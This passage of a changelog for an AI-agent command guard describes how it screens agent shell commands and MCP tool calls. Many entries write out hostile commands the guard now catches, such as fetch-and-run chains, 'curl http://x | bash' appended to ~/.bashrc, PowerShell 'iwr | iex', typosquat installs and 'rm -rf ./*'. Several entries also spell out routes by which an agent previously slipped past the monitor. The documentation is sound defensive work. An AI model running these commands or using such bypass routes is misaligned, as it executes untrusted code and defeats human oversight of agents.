  launcher, `sh -c`, `eval`, `xargs`, `find -exec`) and a shell write or link
  into `~/.config/innerwarden/` are refused, and no allow rule lifts that.
  This raises the cost for an agent; it does not stop one that sets out to
  change its own user's files by a route the hook does not see.
- **A subshell's `cd` ends with the subshell.** `(cd ~ && git pull); rm -rf
  ./*` is judged where the command started.

## 1.5.3 - 2026-10-09

### Upgrade notes: what to do

- **An agent can no longer install a package whose name is one letter off a
  popular one.** `pip install reqeusts` or `npm install expresss` run by an
  agent is now held for review and blocked under the default policy; run by
  you with `innerwarden check` it is `review`, never `deny`. The same holds
  when the look-alike is run or downloaded (`npx expresss`, `uvx pytset`,
  `pip download reqeusts`). If a package you really use is held, install it
  yourself, or allow it for the agent.
- **An agent command the guard cannot parse is held when it fetches and
  runs.** A command that does not parse as shell and names both a download
  (curl, wget, aria2c, axel, a Python or Node network one-liner) and a way to
  run code (sh, bash, eval, source, `./file`, `chmod +x`, an interpreter) is
  `review` and blocked for an agent. One that names only one of the two, or
  neither, is unchanged.
- **`innerwarden status` counts only what your agents sent.** A check you ran
  by hand (and every drill or verify run) is no longer counted as proof that
  your agent's commands reach the guard, so an install whose agent has not
  run a command since it was wired now says so instead of reading as on and
  screening.

### Added

- **Look-alike package names are caught on install.** An install through
  pip, pipx, uv, poetry, pipenv, npm, yarn, pnpm or bun that names a package
  one edit away (a letter added, dropped, changed, or two swapped) from a
  popular PyPI or npm package, and is not itself a known package, is flagged
  `package_typosquat` and named with the package it imitates. This is how
  typosquatted packages, and package names an AI agent made up, get
  installed. Real packages that sit one letter from each other (scipy and
  scapy, react and preact) are known and pass. Names shorter than five
  letters are never compared. The list ships in the repository
  (`crates/agent-guard/data/popular-packages.txt`).
- **Look-alike names are caught when a package is run or downloaded, not
  only installed.** `npx`, `npm exec`, `pnpm dlx`, `yarn dlx`, `bunx`,
  `uvx`, `uv tool run`, `uv tool install`, `pipx run`, `pip download` and
  `pip wheel` are read with the same list and rules, including the package
  named by `npx -p`, `uvx --from`/`--with` and `pipx run --spec`. A run
  executes the package the moment it lands, and a source download runs its
  build code. Only the run's package is read: what follows it is that
  package's own arguments, so `pipx run cowsay reqeusts` is no longer
  flagged for its argument.
- **A fetch-and-run the shell grammar cannot parse is held.** When the
  parser rejected a command no structural check ran, and the fallback only
  fired if a text rule had already recognised the shape, so
  `aria2c URL -o r && chmod +x r && ./r )`, or a Python one-liner that saves
  a payload followed by `bash r.sh )`, was allowed. An unparseable command
  that names both a fetch and a way to run code is now `fetch_exec_unparsed`:
  review, blocked for an agent.
- **`innerwarden proxy` reports each refused tool call to a local
  InnerWarden agent.** When a `guard` or `kill` proxy answers a `tools/call`
  with a denial, it also sends one `POST /api/agent/proxy-block` to the agent
  on this host (`https://127.0.0.1:8787` by default), so the refusal shows up
  there as a case. The report carries what the proxy already records: its
  label, the tool, the redacted summary of the call, the rule ids that fired
  and the mode; never the raw arguments. It goes out from a thread of its
  own and never delays an MCP message. With no agent, the proxy says so once
  on stderr and nothing else changes. `INNERWARDEN_AGENT_URL` names another
  address on this host's loopback (an address elsewhere is refused), and
  `INNERWARDEN_AGENT_URL=off` turns reporting off.
- **Library users: a connected agent's registry row keeps its systemd unit.**
  `Registry::connect` records the system service the process runs in, read
  only from the cgroup the kernel reports for it, so the row survives a
  service restart that changes the pid. `ConnectedAgent`, `PersistedAgent`
  and `AgentSummary` gain `systemd_unit`; `connect_with_facts_and_unit` is
  new. Registry files written by an earlier version load unchanged, and a row
  without a unit is written without the key.

### Changed

- **`innerwarden --version` names the paid release too.** With Active
  Defence installed it adds, on stderr, that `innerwarden-ctl --version`
  gives the host stack's release. stdout stays one line.
- **`upgrade` names what is still running the old binary correctly.** Its
  closing advice called whatever answered on 127.0.0.1:8787 "the dashboard".
  It now names the Community dashboard on 8788 and an `innerwarden serve` on
  8787 each by its own answer, and says nothing about anything else.

### Fixed

- **A download run in two steps is caught.** `f=$(curl -s URL) && echo "$f"
  > /tmp/r.sh && sh /tmp/r.sh` was allowed, and so were the same steps with
  `wget`, `printf`, `tee`, here-strings, heredocs, `cat >`, a copy of the
  file, or `chmod +x` and `./r.sh`. A value fetched into a shell variable is
  now followed into the file it is written to, and running that file is
  screened like any other downloaded script (review, and blocked for an
  agent; denied when the fetch has no TLS, a bare IP, a paste host or a
  decoder). Feeding the variable to a shell's input (`sh <<<"$f"`) is denied.
  Writing a fetched value to a file nobody runs (`echo "$f" > data.json`)
  stays allowed.
- **A download through another tool, then run, is caught like curl's.**
  `aria2c URL -o r && chmod +x r && ./r`, the same with `axel`,
  `lwp-download URL r.sh && sh r.sh`, BSD `fetch URL && sh r.sh`, and a
  Python, Node, Perl, Ruby or PHP one-liner that fetches and writes a file
  (`urlretrieve`, `urlopen` or `requests.get` then `open(...).write`,
  `fetch` then `writeFileSync`, LWP `getstore`/`mirror`, `open-uri` then
  `File.write`, `file_get_contents` then `file_put_contents`) followed by
  running that file were allowed while the curl and wget forms were held.
  They now score the same: review, blocked for an agent, denied with the same
  aggravating evidence. A one-liner that only prints, and a download nobody
  runs, stay allowed.
- **A command written into a shell startup file is screened as a command.**
  `echo 'curl http://x | bash' >> ~/.bashrc` (and the same with `printf`,
  `tee -a`, a here-string, or a heredoc into `.bashrc`, `.bash_profile`,
  `.profile`, `.zshrc`, `/etc/profile.d/` and the other startup files) was
  allowed: the written text is literal output, so only the profile write was
  scored. The text is now analysed as the command it becomes at the next
  login, and it scores what running it directly scores, plus the
  persistence. `export PATH=...` and `alias` lines analyse to nothing and
  stay allowed. A line that is itself flagged when run directly is flagged
  when written too.
- **More ways to fetch and run are caught.**
  - `ssh host cat x | bash` and `ssh host cat x > f && sh f`; `aws ssm
    get-parameter`, `aws secretsmanager get-secret-value` and `vault kv get`
    piped to a shell; files fetched by `ftp`, `lftp`, `tftp` or `smbclient`
    (`get`) and by `nc host port > f`, then run.
  - Archives unpacked by `cpio -i`, `rpm2cpio | cpio`, `ar x`, `dpkg -x`,
    `jar xf`, `unrar x` or `cabextract`, then run; `tar --to-command` on a
    fetched archive.
  - A fetched package installed: `pip install ./x.whl`,
    `npm install ./x.tgz`, `dpkg -i x.deb`, `rpm -i x.rpm`,
    `apk add --allow-untrusted x.apk` (install scripts run).
  - PowerShell: `iwr|irm|Invoke-WebRequest|Invoke-RestMethod ... | iex`,
    `iex (iwr ...)`, `DownloadString` with `IEX`, the same inside
    `powershell -c "..."`, and an `-EncodedCommand` that decodes to it
    (denied: a decoder).
  Each scores like the curl form (review, blocked for an agent; denied with
  the same aggravating evidence).
- **Commands written into files that run later are scored as commands.**
  Besides the shell startup files: `~/.bash_logout`, `~/.ssh/rc`, a
  `PROMPT_COMMAND` value, git hooks, a desktop autostart `Exec=` line, a
  systemd unit's `ExecStart=` lines (including a heredoc), `/etc/cron.d`
  files and lines piped or heredoc-fed to `crontab -`. An inert value
  (`PROMPT_COMMAND='history -a'`, an ordinary backup job) is unchanged.
- **A clone that is built or run is recorded, and scored only with
  hostile evidence.** `git clone URL && cd repo && make` (or `./install.sh`,
  `npm install`, `pip install .`) gets a low `clone_and_run` signal and is
  allowed, because developer agents clone and build all day. With no TLS, a
  bare public IP, or a paste or short-link host it scores as a
  download-and-run (deny).
- **Running something from a fetched archive is caught.**
  `curl -LO URL/a.tgz && tar xzf a.tgz && ./a/run`,
  `curl -sL URL | tar xz && cd pkg && ./install.sh`,
  `git archive --remote=R HEAD | tar -x && sh x.sh`, an `aws s3 cp` of a
  zip unpacked with `unzip` and run, and the same through `7z x`, `bsdtar`,
  `python -m zipfile -e`/`tarfile -e`, or `gunzip`/`xz -d` first, were
  allowed: the download never names the file that runs. A fetched or
  remotely read archive unpacked in the same command now marks what it
  wrote (its `-C`/`-d`/`-o` directory, or the working directory), and
  running a path from there scores like the plain download-and-run (review,
  blocked for an agent). Unpacked and only listed or read stays allowed.
- **Code read from an object store, a cluster, a container or another host
  is treated as fetched.** `aws s3 cp s3://b/k - | bash`,
  `source <(aws s3 cp s3://b/k -)`, `gsutil cat`/`gcloud storage cat` piped
  to a shell, `kubectl get ... -o jsonpath=... > r.sh && sh r.sh`,
  `kubectl exec pod -- cat x | bash`, `docker run img cat x | sh`,
  `rclone cat remote:x | bash`, `scp host:/x . && bash x`,
  `rsync -a host:/x ./x && ./x`, `kubectl cp`/`docker cp` then run,
  `az storage blob download --file x && bash x` and
  `git show origin/main:x | bash` were allowed: only HTTP downloaders
  counted as a fetch. They now score like the curl form (review, blocked for
  an agent; deny when sourced or evaluated). A copy that keeps the source's
  mode (`rsync -a`, `scp -p`, `kubectl cp`, `docker cp`) counts as already
  executable. Copies nobody runs, uploads, `kubectl get -o yaml > f`,
  `kubectl exec pod -- ls`, and `kubectl`/`helm completion` stay allowed.
- **A tool's own shell setup line is no longer refused as fetched code.**
  `source <(kubectl completion bash)`, `source <(helm completion bash)`,
  `eval "$(gh completion -s bash)"`, `source <(rustup completions bash)`,
  `eval "$(pyenv init -)"`, `eval "$(direnv hook bash)"` and
  `eval "$(starship init bash)"` were denied, run directly or written into
  `~/.bashrc`: any substitution sourced or evaluated counted as fetched
  code. One installed program printing its setup, in a command that fetches
  nothing, is now allowed. A substitution that fetches, decodes, prints
  code the command wrote itself (`echo`, `printf`, a heredoc, `python -c`),
  runs a file from the working directory or a temp directory, or sits in a
  command that fetches anything is still denied
  (`source <(curl ...)`, `eval "$(curl ... | base64 -d)"`).
- **Running a file after `cd` into a temp directory is seen.**
  `cd /tmp && ./x`, `cd /dev/shm; sh p`, `pushd /var/tmp`, and a `cd` into a
  directory the same command made with `mktemp -d` were allowed: the
  temp-directory check only matched `/tmp/x` written out. The working
  directory the command moves into is now followed, so running a relative
  file from there is flagged like `/tmp/x` (review on its own, and a
  fetch-and-run there is denied). `cd /tmp && ls` or `cat x` runs nothing
  from it and stays allowed. A subshell's `cd` ends with the subshell, so
  `(cd /tmp && ls); ./build.sh` is not flagged, while `(cd /tmp && ./x)` and
  `{ cd /tmp; ./x; }` are.
- **Sourcing a downloaded file with `.` is seen.** `curl -o r.sh URL && .
  ./r.sh` was allowed while `source ./r.sh` was caught.
- **An MCP wrapper whose proxy binary is gone is not reported as guarded.**
  The agent list, the dashboard and `status` judged an MCP agent's wrapper by
  its text, so a config pointing at a removed or moved `innerwarden` read
  "guarded" while every one of its servers failed to start. It now says the
  proxy program does not exist and offers `innerwarden agents connect <name>`
  in the mode the wrappers had. Nothing is unwrapped.

### Project

- The benchmark gate holds the new cases: 245 attacks caught, every command
  attack blocked for an agent, fetch-and-runs after `cd` into a temp
  directory denied, startup-file writes charged for what they write, and 0
  of 160 ordinary commands flagged
  (including unparseable ones that only fetch or only run, `npx`/`uvx` runs
  of real packages, downloads through aria2c, axel and lwp-download that are
  not run, network one-liners that only print or save data, and `cd /tmp`
  followed by commands that run nothing from it).
- The OWASP Agentic map (`crates/agent-guard/OWASP-AGENTIC-TOP-10.md`) no
  longer says every download-and-execute and temp-dir executable is denied.
  Its ASI05 row now says what the benchmark measures: a plain fetch-and-run
  over TLS from a named host is review and blocked for an agent; no TLS, a
  bare IP, a paste or short-link host, a decoder, or fetched bytes reaching
  an interpreter by substitution, `eval` or a nested shell is deny; reverse
  shells are deny; an obfuscated payload is review and blocked for an agent;
  a temp-dir executable alone is review and not blocked for an agent. It
  also says the guard judges one command at a time, and that a clone built
  in the same command is allowed unless its source is hostile.
- The same map's other rows now say only what the code does: ASI01 counts
  27 prompt-injection patterns (it said 24) and says an injected tool result
  is a review alert, not blocked; ASI02 says non-blocking dangerous-command
  patterns are review, not deny; ASI03 names the credential signals
  Community actually emits (it listed `credential_access`, which no rule
  emits, and Active Defence's privilege-provenance signals as Community's);
  ASI10 states the measured split (destruction, tampering, miners and
  reverse shells deny; scheduled tasks and services review and blocked for
  an agent; a shell-profile write alone allowed).
- The release job fails when the `guard-vX.Y.Z` source tag is missing or
  names a different commit than the one it built.
- A test pins that the `.deb` and `.rpm` ship `/usr/bin/innerwarden` and no
  `iw` shortcut (`iw` is the Linux wireless tool's name).
- The coverage job reads its configuration again (the engine name is
  case-sensitive, so the 75% floor and the excludes were silently ignored)
  and fails if the configuration is ever rejected.
- Every dashboard journey test runs at a fixed clock, so the suite no longer
  breaks when the calendar moves past its fixtures.
- The CLI's tests are no longer answered by an `innerwarden-ctl` installed on
  the machine running them.

## 1.5.2 - 2026-10-07

### Upgrade notes: what to do

- **OpenClaw message hook: install it again, this once.**
  `innerwarden observe install`, then restart the OpenClaw gateway. The hook
  an earlier version wrote keeps running after an upgrade, and with it
  Control UI chats are recorded only after 15 minutes and without the agent's
  name. The install now also adds the reply plugin (below), and grants it the
  conversation access OpenClaw requires before a plugin can read a turn; it
  says so, and leaves alone an entry you turned off and your `plugins.allow`,
  `plugins.deny` and `plugins.enabled`. From this version on, `upgrade` brings
  the hook and the plugin up to the new version's itself (`observe refresh`).
  `innerwarden observe status` and the dashboard's Messages card say when
  either is an earlier version's, or is not what InnerWarden wrote.
- **A copy installed from the `.deb` or `.rpm` is upgraded with the package.**
  `innerwarden upgrade` refuses it and exits 2, so an unattended
  `sudo innerwarden upgrade` on such a host now fails. Use the command it
  prints (it fetches the package and its checksum into a private directory,
  checks it, then installs it), or `--yes` to replace the file anyway.
  `upgrade --check` reports on every kind of install.
- **`innerwarden uninstall` on a packaged copy** removes the hooks, the
  configuration and the `iw` / `iw-guard` shortcuts, leaves the binary to
  `sudo apt remove innerwarden` or `sudo dnf remove innerwarden`, and exits 1
  with "partly removed" until that is done.
- **`innerwarden uninstall` removes only the installer's copy.** A binary
  the installer did not lay down (installed with `cargo install`, with Scoop,
  or a copy another program keeps for itself) is now left where it is, with
  the command that removes it where there is one, and the run exits 1 with
  "partly removed". After uninstalling a cargo or Scoop copy, finish with
  `cargo uninstall innerwarden` or `scoop uninstall innerwarden`.
- **Reconnect MCP agents to have them named.** `innerwarden agents connect`
  now writes `--label` and `--agent` into each MCP wrapper, so its decisions
  are recorded under the session `mcp:<agent>` instead of `mcp:innerwarden`.
  Run it again for wrappers an earlier version wrote; history recorded before
  that stays under the old session.

### Changed

- **A Control UI ask is recorded with how the turn ended.** OpenClaw reports
  no reply from its Control UI chat to hooks, so an ask made there was
  recorded after two minutes with the outcome not seen. `observe install`
  now adds an OpenClaw plugin, `innerwarden-replies`, that reads the end of
  each Control UI turn a person started (OpenClaw's typed `agent_end` hook)
  and reports only its shape, a tool call, a reply, or neither, to the new
  `innerwarden observe ended`. That closes the ask whose message started the
  turn, and no other: a turn that replied with no tool call is recorded as
  `undetermined` with `decider_basis: replied_without_tool_call` (the agent
  ran nothing; the plugin never reads the words, so whether it declined is
  not seen); one that called a tool is `undetermined`, `tool_call_in_turn`,
  because a tool the guard does not screen leaves nothing in its record, and
  a reply after it does not show the agent declined; one that ended with
  nothing said is `undetermined`, `turn_ended_without_reply`. A heartbeat or
  cron turn never closes an ask. A turn holding a message in a shape the
  plugin does not know is not reported, unless a tool call it recognises
  makes it `tool_call_in_turn`, and the ask is recorded as not seen. Where
  the plugin runs, the message hook's two-minute timer leaves an ask to the
  end of its turn (at most 15 minutes), so a long turn is not recorded as
  "this chat does not report your agent's reply", and what the guard
  recorded late in it is in the record. The plugin reads Control UI turns
  only.
  The gateway logs the plugin as one it cannot verify, because it was not
  installed through `openclaw plugins install`.
- **A reply is no longer read as the model declining.** `observe reply`
  recorded a reply with nothing the guard screens in its window as
  `model_refused`, and the dashboard said "Your agent declined on its own".
  The reply's words are never read, and a tool the guard does not screen
  (OpenClaw's own exec) leaves nothing in its record, so an ask the agent
  carried out with such a tool, or answered by doing what was asked in
  words, read the same. Such a reply is now `undetermined`, with
  `decider_basis: no_screened_execution_recorded_in_window`, and the
  dashboard says the agent replied and nothing the guard screens ran, under
  the outcome "Answered". Records an earlier version wrote that way read the
  same. `model_refused` is written only when a caller states it
  (`observe reply --decider`).
- **`upgrade` refreshes what `observe install` wrote.** After the binary is
  replaced, the new binary's `innerwarden observe refresh` replaces the
  message hook's and the reply plugin's files with the new version's where
  they are exactly what an earlier release wrote. A file somebody changed is
  left as it is and named, nothing that was not installed is added, and the
  gateway is never restarted: the upgrade says to restart it.
- **The MCP proxy ends with its session.** When the client closes, the proxy
  relays the server's last output for 3 s, then stops the server: SIGTERM to
  its whole process group, SIGKILL 1 s later, so a server started through
  `npx`, `uvx` or `sh -c` is stopped with its launcher.
- **The MCP loop breaker holds one call for one window.** An identical tool
  call made more than 3 times within 60 s is refused (guard) or flagged
  (advisory), that call only, and the refusal says when it is accepted again.
  The cost ceiling is gone. Library users: `innerwarden_agent_guard::breaker`'s
  `BreakerConfig` and `Breaker::record` changed.
- **Conversation records claim less, and say why.** `guard_denied` is recorded
  only for an observed reply and an enforce-mode refusal on a line naming the
  agent that was asked and the session the ask arrived in. A refusal of the
  same agent in another conversation, or under the MCP proxy's own session
  (how OpenClaw is guarded), is recorded as `undetermined` with
  `decider_basis: guard_block_recorded_in_window`; it used to stamp whatever
  ask was waiting `guard_denied`, `enforced: true`. A monitor-mode
  `would_block` in the window is recorded as `undetermined` with
  `decider_basis: flagged_action_ran_in_window`, never as a refusal or as the
  model declining. `guard.attempt` gains `agent` and
  the bases `next_message_before_reply`, `channel_reports_no_reply`,
  `pending_limit_reached`, `pending_state_unavailable` and
  `flagged_action_ran_in_window`; `guard.blocked` gains `agent`.
- **A guard event file that cannot be written is an outage.** A link, a second
  name, something that is not a plain file, or a file this account cannot
  append to, at `guard-events.jsonl` or `record-health.json`, is reported by
  `innerwarden graph` and the dashboard with the fix, instead of dropping lines
  silently.

### Fixed

- **`uninstall` no longer deletes a copy it did not install.** It decided
  from npm, the `.deb`/`.rpm` database and whether the file could be deleted,
  and as root every file can be, so `sudo innerwarden uninstall` run from a
  copy another program keeps for itself deleted it. The binary is now removed
  only when it is the installer's: named `innerwarden`, `iw` or `iw-guard`,
  and either in the installer's directory for this account (`~/.local/bin`,
  or `%LOCALAPPDATA%\Programs\InnerWarden` on Windows) or with an `iw` or
  `iw-guard` beside it that links to it or is a copy of it. Anything else is
  kept and named, and the hooks and configuration are still removed.
- **`uninstall --dry-run` writes nothing.** The preview found out whether the
  binary could be deleted by creating and deleting a file beside it. Both the
  preview and the run now read that from the file system's own permission
  check, without writing.
- **`upgrade` refreshes the installer's `iw` and `iw-guard` copies.** Where
  the shell installer cannot make a link it copies the binary instead, and on
  Linux and macOS `upgrade` replaced only `innerwarden`, so `iw` went on
  running the build first installed, and `uninstall` then kept both copies as
  another program's. A copy is now replaced with the binary when it is this
  build or any earlier one (recognised by the release key every build since
  1.1.0 carries, without running it), and `uninstall` removes such a copy. A
  link is left a link, and a file that is not InnerWarden is not touched.
- **`upgrade` never writes through a link at its staging name.** The new
  binary is staged beside the old one, and a link planted under that name, in
  a directory another account can write, made `sudo innerwarden upgrade` write
  the release (and its first check, an empty file) over whatever the link
  pointed at. Whatever is at the staging name is now removed first and the
  file is created afresh.
- **Removing one agent's hook no longer prints `rm <path>`.** `innerwarden
  uninstall <agent>` ended by handing out a bare `rm` of whatever copy was
  running, an npm or package copy included. It now points at the full
  `innerwarden uninstall`, which decides whether the binary is its to remove.
- **A question about a miner is not an attack attempt.** The command rules
  refuse a miner binary wherever its name appears, so a message such as "how
  do I remove xmrig from this box?" was recorded as a conversation attempt,
  deny 40. A name that is only talked about is now taken out before the rules
  read the message: a plain word the sentence acts on right before it
  ("remove xmrig", "kill the xmrig process", "we found minerd") or asks about
  in the clause that holds it ("how do I remove xmrig", "is xmrig running"),
  and `t-rex` unless the message is about mining. A message that asks for
  anything, gives the miner as a command (`nohup xmrig`, `xmrig -o ...`), or
  has a defence word only elsewhere in the sentence ("configure xmrig and
  monitor the hashrate") is read as before. What is no longer recorded: a
  request with no request verb, phrased as a question about the miner ("what
  if xmrig ran on every core?") or with a defence or report word right
  before its name ("now that we found xmrig, keep it going"). The command
  such an ask leads to is still screened: a miner in a command an agent runs
  is still refused.
- **A held lock no longer holds back the hook's verdict.** The hook records
  each decision before it answers, and one of the locks that write takes was
  waited for with no time limit, so any account able to open that lock (the
  guarded agent's own included) could keep the hook from answering at all.
  Every lock the record takes is now waited for at most 100 ms: the verdict is
  returned as normal, and the skipped record is reported as a recording
  outage, `graph_lock_timeout`. Agent configuration writes give up after 2 s
  and say which lock was held, and so does the agent-policy lock
  (`~/.config/innerwarden/agents.lock`) after 5 s: `enforce`, `dry-run`,
  `agents connect` and `disconnect`, `setup`, `upgrade`'s rewiring and the
  dashboard's auto-connect all take it first, and a holder that never let go
  kept each of them waiting for good. `innerwarden observe` gives up after 1 s, and
  an ask it could not hold is recorded at once with its outcome unknown.
- **One large tool result no longer clears what the MCP proxy remembers.**
  The proxy keeps the long values of each tool result so that a later call
  carrying one is flagged (`AG-TAINT`). A single large result, such as an
  image read or a file of many short words, used to push out every value kept
  before it. The newest results are now kept whole; each older one keeps a
  sample of up to 4 KiB, its network destinations (URLs, e-mail addresses,
  `host:port`) first, then the rest drawn by a key chosen per proxy; a value
  over 256 bytes is kept by its start, which still matches a call that
  carries all of it. The store stays bounded, at about 1.1 MiB per proxy.
  What a result's author still decides is how much of their own result
  competes for its share: once the store is full, the next maximal result
  the agent reads cuts a result to its share, and a page padded with other
  destinations keeps only some of them. A value is found by its hash, so a
  session that lists thousands of names under one directory no longer slows
  every message the proxy relays; the search of one call is bounded, and a
  call whose arguments cannot be checked in that bound is refused
  (`AG-TAINT`) rather than passed unchecked.
- **Each MCP proxy uses about half the memory.** A proxy compiled every rule
  in the shipped corpus as it started, about 47 MB before it had screened a
  message, half of it rules for model prompts that a proxy never applies.
  Each rule is now compiled the first time something it applies to is
  screened, before that first verdict is given: a proxy starts at about 6 MB
  and, once tool calls and results have passed through it, holds about 25 MB
  where it held about 52 MB (Linux x86_64). The verdicts are unchanged.
- **The MCP proxy no longer refuses every `write_file`.** ATR-2026-040 matched
  the tool's name, so in guard mode (the proxy's default) every write through
  a filesystem server was refused, an ordinary one inside its allowed
  directories included, while the same server's `edit_file` and `move_file`
  were not checked at all. The rule no longer looks at the name. A tool call
  that may change a file granting privilege or a login, holding code that
  runs as root, or carrying the guard itself, is refused instead
  (`AG-PRIV-WRITE`), whichever tool makes it and however the path is spelled
  (`/etc//sudoers`, `/tmp/../etc/cron.d/x`, `/private/etc/...`, `file://`):
  the sudo, doas and polkit rules, PAM, accounts and groups, SSH keys and
  server settings, root's home, the dynamic linker's preload list, system
  cron jobs and logrotate, boot services and systemd's defaults, the login
  scripts every account runs (`/etc/profile`, `/etc/profile.d`,
  `/etc/bash.bashrc`, `/etc/environment`, ...), network dispatcher scripts,
  udev and kernel module rules, kernel settings (`/etc/sysctl.d`), the
  package manager's hooks and install scripts, the system's programs and
  libraries, and the guard's own wiring: the agent settings that carry its
  hook (`.claude/settings.json`), every MCP configuration it wraps
  (`.claude.json`, a project's `.mcp.json`, `.cursor/mcp.json`,
  `.codex/config.toml`, `.gemini/settings.json`, `openclaw.json`), the
  OpenClaw hook and plugin `observe install` lays down, and its own
  configuration (`~/.config/innerwarden`, `/etc/innerwarden`,
  `/var/lib/innerwarden`). Only a path where the call writes (an argument
  such as `path`, `source`, `destination`, `file`) is judged against every
  one of these; a single path anywhere else (an argv entry, an unusual
  argument name) is judged against all but the system's programs, and a
  sentence, a search query or a command line is not taken for a target. The
  filesystem server's read-only tools, and any tool its server declares
  read-only (`readOnlyHint`), may name these files. What is left open: a
  write tool whose target argument has an unusual name is not held to the
  system's programs; a relative path (and `~/`) is held only to what is the
  same in every directory (`.ssh`, the agent settings), so `etc/sudoers.d/x`
  sent to a server working in `/` is not judged; Windows paths are not
  judged; links are not followed; and the configuration of another program
  that runs as root (a web server's, a container runtime's) is left to the
  other rules.
- **`innerwarden agents` and `status` report the mode each MCP proxy runs in.**
  The mode was guessed by searching the agent's configuration for the words
  `advisory`, `warn`, `guard` and `kill` anywhere in it, so a log level or a
  server's own argument could decide it, and a wrapper set to
  `--mode=advisory` beside any other `"guard"` was listed as enforce while it
  only recorded. Each wrapper's arguments are now read the way the proxy reads
  them, the way the dashboard already did, and a flag's value is never taken
  for the mode (`--label --mode=guard` is a label). A wrapper whose last
  option before `--` is a flag waiting for its value is listed as not guarded:
  the proxy takes that `--` as the value and runs the options written after
  it. A wrapper whose proxy refuses one of its words (`--verbose`) exits
  before its server starts, and is listed as not guarded. Only a command
  named `innerwarden`, `iw` or `iw-guard` is taken for the guard: any name
  that began with `innerwarden` counted, so a script under such a name was
  listed as the guard in enforce mode while it ran the server unscreened.
  Such a server is now listed as not guarded, and connecting the agent wraps
  it in the real proxy. The configuration is read, not the binary: a program
  written under one of the guard's own names is still taken for it. A
  generic MCP client now shows the mode of its own configuration: it showed
  none, and one kept in `~/.claude/` showed Claude Code's.
- **A loop-breaker finding names the risks a loop is.** `AG-ASI09-BREAKER`
  carried no OWASP Agentic class, so its case read "OWASP Agentic: none",
  and its id points at ASI09, human-agent trust exploitation, which a loop is
  not. It now names ASI02 (tool misuse and exploitation) and ASI08
  (cascading failures) in its record and on its case. The id is unchanged,
  so an alert rule written against it keeps matching.

## 1.5.1 - 2026-09-30

### Fixed

- **A hook whose binary is gone is no longer "on".** `status`, `agents` and the
  dashboard now say so, name the missing path and the `innerwarden install`
  that fixes it. A week-old record no longer proves commands reach the guard,
  and auto-connect logs a change once, not every minute.
- **Auto-connect never writes a hook naming a binary that is gone.** After an
  in-place upgrade on Linux, or once a build is cleaned, the dashboard's
  background setup could point a hook at a path that no longer runs. It now
  writes nothing and says once that the dashboard needs a restart.

## 1.5.0 - 2026-09-30

### Added

- **A dashboard you can read at a glance.** `innerwarden dashboard` now opens
  on five pages in the same design as the full product: Overview (what your
  agents did, messages sent to your agent, and what this machine does not
  watch), Protection (what Community covers here, with what it refused for
  you since the guard's log began), Cases, Agents and Tokens.
- **Cases.** Every command or tool call the guard flagged is a case with three
  answers: what happened, what InnerWarden did (seen, decided, enforced,
  verified), and what you can do, as the exact `innerwarden` command. Runs of
  one reason fold into one line; filters and links live in the address.
- **An honest path to Active Defence.** At most one offer per page, tied to
  the case on screen, dismissible, never a lock or a blur. Where Active
  Defence is installed, the offer is one line saying so.

### Changed

- **Destroying the host's audit trail is HIGH**, not MEDIUM, and a denied
  secret read is no longer MEDIUM.
- **Counts say what they count.** One timestamp format, one count per
  session on every screen, and a partial read says "at least N".

### Fixed

- **rustls 0.23.45** closes RUSTSEC-2026-0285.
- **The vendored ATR rules carry their MIT notice.**

## 1.4.9 - 2026-09-08

### Fixed

- **Windows: `innerwarden upgrade` now replaces the running binary.** It
  renamed the new file over the running `innerwarden.exe`, which Windows
  refuses (`Access is denied`), and then advised `sudo innerwarden upgrade`.
  The running image is now parked beside itself, the new one lands in its
  place, and the installer's `iw.exe` / `iw-guard.exe` copies are refreshed
  too. The advice on Windows names the real causes: another InnerWarden
  process, or a folder that needs an elevated PowerShell.

## 1.4.8 - 2026-09-08

### Fixed

- **The hook no longer lets a tool call it cannot read pass in silence.** Fed an
  empty stdin, non-JSON, or a shell tool call with no command string, the hook
  exited 0 and said nothing, so a payload shape it did not understand (an agent
  update, an encoding problem) would have let every command run unscreened. In
  enforce it now refuses such a call (exit 2, reason on stderr); in monitor it
  says the call was not screened (exit 1). Well-formed calls for tools that
  carry no command (Read, Edit) still pass untouched.

## 1.4.7 - 2026-09-08

### Fixed

- **Windows: the binary now starts on a stock machine.** `innerwarden.exe`
  imported `vcruntime140.dll`, which a fresh Windows without the Visual C++
  redistributable does not have; the installer said "Done" and the first
  command died with `STATUS_DLL_NOT_FOUND`. The C runtime is now linked in
  (`+crt-static`) and the release build fails if the exe still imports it.
- **Windows: the install command names `www.innerwarden.com`.** Windows
  PowerShell 5.1 does not follow the apex's 308 redirect; PowerShell 7 does,
  which is why the runners never saw it.

## 1.4.6 - 2026-09-08

Two things a new user meets in the first hour on a stock Ubuntu 24.04 host,
found by installing the way the site says to and running each command in
`--help`.

### Fixed

- **`innerwarden contain` on Ubuntu 24.04.** The jail died with
  `bwrap: setting up uid map: Permission denied`. The kernel there restricts
  unprivileged user namespaces (`kernel.apparmor_restrict_unprivileged_userns`)
  and the image ships no AppArmor profile for `bwrap`. `contain` now checks
  both before building the jail and, when it cannot, prints the profile that
  grants `bwrap` a user namespace and the `apparmor_parser` line to load it,
  then runs nothing. The sysctl stays as it was.
- **`innerwarden upgrade` on an up-to-date host** fetched the published
  binary, replaced identical bytes and reported "Upgrade complete". It now
  reads the manifest first and stops with "Already on the latest build", as
  `upgrade --check` already did. `--yes` still replaces the file.

## 1.4.5 - 2026-08-30

We ran the product the way a bank's security team would: 764 realistic commands,
built as nine independent batches and deliberately mixed. 310 that must be
refused, 357 that must run, 97 judgement calls. The benign half is the larger one
on purpose, because a guard that blocks real work gets switched off in week two.

                       before    after
    attacks blocked     48.7%    75.2%
    attacks caught      51.0%    78.7%
    ordinary work       96.6%    98.6%
    hard false positives    7        0

### Added

- **The guard now has a memory.** A value that arrives in a tool result and
  reappears as an argument later is the attack a stateless screener cannot see,
  because the second command is not wrong; its origin is. A `PostToolUse` hook
  carries results in, the session remembers what they contained for 30 minutes,
  and a command carrying one is held for review with the value and the source
  tool named. It never lowers a verdict: a command already refused stays refused.

  `innerwarden upgrade` now reconciles the hooks it wrote, so an existing
  install gets the observation half rather than a build that has the defence and
  a configuration that never invokes it.

- Detection for seven families that previously scored zero: cloud control-plane
  actions (audit trail, threat detection, IAM grants, public buckets, key
  deletion), data destruction, anti-forensics, persistence installs, Kubernetes
  escapes, untrusted software sources, and local credential stores and kernel
  hardening knobs. Every family ships its ordinary neighbours as pinned
  negatives, so `terraform plan`, `kubectl get`, `crontab -l`, `chmod 755` and
  `journalctl -u` stay untouched.

- Certificate verification being switched off is now visible: `--trusted-host`,
